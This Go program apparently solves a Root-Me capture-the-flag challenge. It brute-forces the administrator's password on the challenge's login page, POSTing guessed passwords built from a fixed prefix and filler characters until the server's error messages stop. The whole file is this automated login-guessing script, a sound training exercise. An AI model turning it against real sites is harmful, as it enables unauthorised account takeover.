package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func main() {
	str := "!\"#$%&\\'()*+,-/:;<=>?[]^_`{|}~\\QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm Username	Email	Account type Steve	steve@jobs.com	subscriber John	John@doe.org	administrator Eric	ric@ard.biz	subscriber Jerry	Jerry@tomcat.net	subscriber Elise	Elise@tomcat.net	subscriber"
	a := 0
	for i := 32; i <= 126; i++ {
		payload := "ueiJ"
		init := payload
		if !strings.ContainsRune(str, rune(i)) {
			for j := 32; j <= 126; j++ {
				if !strings.ContainsRune(str, rune(j)) {
					for k := 32; k <= 126; k++ {
						if !strings.ContainsRune(str, rune(k)) {
							for m := 32; m <= 126; m++ {
								if !strings.ContainsRune(str, rune(m)) {
									payload += string(rune(i)) + "a" + string(rune(j)) + string(rune(k)) + "@" + string(rune(m)) + ".oS"
									url := "http://challenge01.root-me.org/web-serveur/ch24/?action=login"
									postData := "username=John&password=" + payload
									req, _ := http.NewRequest("POST", url, bytes.NewBufferString(postData))
									req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
									res, _ := http.DefaultClient.Do(req)
									defer res.Body.Close()
									body, _ := ioutil.ReadAll(res.Body)
									resp := string(body)
									if !strings.Contains(resp, "Wrong") && !strings.Contains(resp, "Bad char") {
										fmt.Println(resp)
										fmt.Println("The password is:", payload)
										os.Exit(1)
									} else {
										fmt.Println(payload)
										fmt.Println(a, "not this one...")
										a++
									}
								}
								payload = init
							}
						}
					}
				}
			}
		}
	}
}
